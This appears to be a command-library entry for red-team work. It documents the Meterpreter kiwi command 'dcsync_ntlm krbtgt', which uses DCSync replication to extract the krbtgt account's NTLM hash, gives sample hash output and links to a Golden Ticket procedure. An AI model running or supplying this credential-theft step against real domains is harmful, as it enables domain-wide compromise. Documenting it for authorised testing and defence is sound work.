---
id: new-uuid-2
name: dcsync-ntlm-hash-for-krbtgt
type: command
executor: meterpreter
data: dcsync_ntlm krbtgt
output: null
created_at: '2023-04-06T03:56:04.748900+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - credentials
  - dcsync
verified: true
validated: true
---

# dcsync-ntlm-hash-for-krbtgt

## Command

```meterpreter
dcsync_ntlm krbtgt
```

## Description

Uses the DCSync technique via kiwi to retrieve the NTLM hash specifically for the krbtgt account, mimicking domain replication to extract password hashes without direct DC access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| krbtgt | Fixed target: the krbtgt domain user | Yes |

## Examples

### Basic Usage

```meterpreter
dcsync_ntlm krbtgt
```

## Expected Output

User : krbtgt
RID : 502
LM : 
NTLM : d125e4f69c851529045ec95ca80fa37e

## Related

- [[procedures/pass-the-golden-ticket-attack-using-meterpreter]]
- [[commands/dcsync-secrets-for-krbtgt]]
